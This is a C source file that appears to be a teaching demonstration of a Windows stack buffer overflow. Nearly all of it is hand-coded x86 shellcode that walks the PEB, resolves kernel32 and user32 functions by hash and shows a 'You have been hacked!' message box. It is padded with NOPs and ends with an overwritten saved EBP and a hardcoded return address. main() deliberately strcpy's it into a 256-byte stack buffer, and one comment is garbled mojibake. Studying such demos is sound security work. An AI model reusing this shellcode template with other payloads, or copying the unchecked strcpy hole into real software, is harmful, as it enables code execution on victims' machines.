#include "stdio.h"
#include "string.h"

char name[] = 
				"\xFC"                                  //cld
				"\x68\x6A\x0A\x38\x1E"                  //push        1E380A6Ah
				"\x68\x63\x89\xD1\x4F"                  //push        4FD18963h
				"\x68\x32\x74\x91\x0C"                  //push        0C917432h
				"\x8B\xF4"                              //mov         esi,esp
				"\x8D\x7E\xF4"                          //lea         edi,[esi-0Ch]
				"\x33\xDB"                              //xor         ebx,ebx
				"\xB7\x04"                              //mov         bh,4
				"\x2B\xE3"                              //sub         esp,ebx
				"\x66\xBB\x33\x32"                      //mov         bx,offset main+35h (00401045)
				"\x53"                                  //push        ebx
				"\x68\x75\x73\x65\x72"                  //push        72657375h
				"\x54"                                  //push        esp
				"\x33\xD2"                              //xor         edx,edx
				"\x64\x8B\x5A\x30"                      //mov         ebx,dword ptr fs:[edx+30h]
				"\x8B\x4B\x0C"                          //mov         ecx,dword ptr [ebx+0Ch]
				"\x8B\x49\x1C"                          //mov         ecx,dword ptr [ecx+1Ch]
				"\x8B\x09"                              //mov         ecx,dword ptr [ecx]
				"\x8B\x69\x08"                          //mov         ebp,dword ptr [ecx+8]
				"\xAD"                                  //lods        dword ptr [esi]
				"\x3D\x6A\x0A\x38\x1E"                  //cmp         eax,1E380A6Ah
				"\x75\x05"                              //jne         find_functions (0040106c)
				"\x95"                                  //xchg        eax,ebp
				"\xFF\x57\xF8"                          //call        dword ptr [edi-8]
				"\x95"                                  //xchg        eax,ebp
				"\x60"                                  //pushad
				"\x8B\x45\x3C"                          //mov         eax,dword ptr [ebp+3Ch]
				"\x8B\x4C\x05\x78"                      //mov         ecx,dword ptr [ebp+eax+78h]
				"\x03\xCD"                              //add         ecx,ebp
				"\x8B\x59\x20"                          //mov         ebx,dword ptr [ecx+20h]
				"\x03\xDD"                              //add         ebx,ebp
				"\x33\xFF"                              //xor         edi,edi
				"\x47"                                  //inc         edi
				"\x8B\x34\xBB"                          //mov         esi,dword ptr [ebx+edi*4]
				"\x03\xF5"                              //add         esi,ebp
				"\x99"                                  //cdq
				"\x0F\xBE\x06"                          //movsx       eax,byte ptr [esi]
				"\x3A\xC4"                              //cmp         al,ah
				"\x74\x08"                              //je          compare_hash (00401093)
				"\xC1\xCA\x07"                          //ror         edx,7
				"\x03\xD0"                              //add         edx,eax
				"\x46"                                  //inc         esi
				"\xEB\xF1"                              //jmp         hash_loop (00401084)
				"\x3B\x54\x24\x1C"                      //cmp         edx,dword ptr [esp+1Ch]
				"\x75\xE4"                              //jne         next_function_loop (0040107d)
				"\x8B\x59\x24"                          //mov         ebx,dword ptr [ecx+24h]
				"\x03\xDD"                              //add         ebx,ebp
				"\x66\x8B\x3C\x7B"                      //mov         di,word ptr [ebx+edi*2]
				"\x8B\x59\x1C"                          //mov         ebx,dword ptr [ecx+1Ch]
				"\x03\xDD"                              //add         ebx,ebp
				"\x03\x2C\xBB"                          //add         ebp,dword ptr [ebx+edi*4]
				"\x95"                                  //xchg        eax,ebp
				"\x5F"                                  //pop         edi
				"\xAB"                                  //stos        dword ptr [edi]
				"\x57"                                  //push        edi
				"\x61"                                  //popad
				"\x3D\x6A\x0A\x38\x1E"                  //cmp         eax,1E380A6Ah
				"\x75\xA9"                              //jne         find_lib_funtions (0040105f)
				"\x83\xEC\x50"                          //sub         esp,50h
				"\x33\xDB"                              //xor         ebx,ebx
				"\x53"                                  //push        ebx
				"\x68\x69\x6E\x67\x20"                  //push        20676E69h
				"\x68\x57\x61\x72\x6E"                  //push        6E726157h
				"\x8B\xC4"                              //mov         eax,esp
				"\x53"                                  //push        ebx
				"\x68\x2E\x29\x20\x20"                  //push        2020292Eh
				"\x68\x20\x4A\x2E\x59"                  //push        592E4A20h
				"\x68\x21\x28\x62\x79"                  //push        79622821h
				"\x68\x63\x6B\x65\x64"                  //push        64656B63h
				"\x68\x6E\x20\x68\x61"                  //push        6168206Eh
				"\x68\x20\x62\x65\x65"                  //push        65656220h
				"\x68\x68\x61\x76\x65"                  //push        65766168h
				"\x68\x59\x6F\x75\x20"                  //push        20756F59h
				"\x8B\xCC"                              //mov         ecx,esp
				"\x53"                                  //push        ebx
				"\x50"                                  //push        eax
				"\x51"                                  //push        ecx
				"\x53"                                  //push        ebx
				"\xFF\x57\xFC"                          //call        dword ptr [edi-4]
				"\x53"                                  //push        ebx
				"\xFF\x57\xF8"                          //call        dword ptr [edi-8]	
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90\x90\x90\x90"
				"\x90\x90"								//256¸ö×Ö½Ú
				"\x90\x90\x90\x90"						//EBP
				"\x80\xfe\x12";							//return address
				
int main()
{
	char buffer[256];
	strcpy(buffer, name);
	printf("%s\n",buffer);
	getchar();
	return 0;
}
				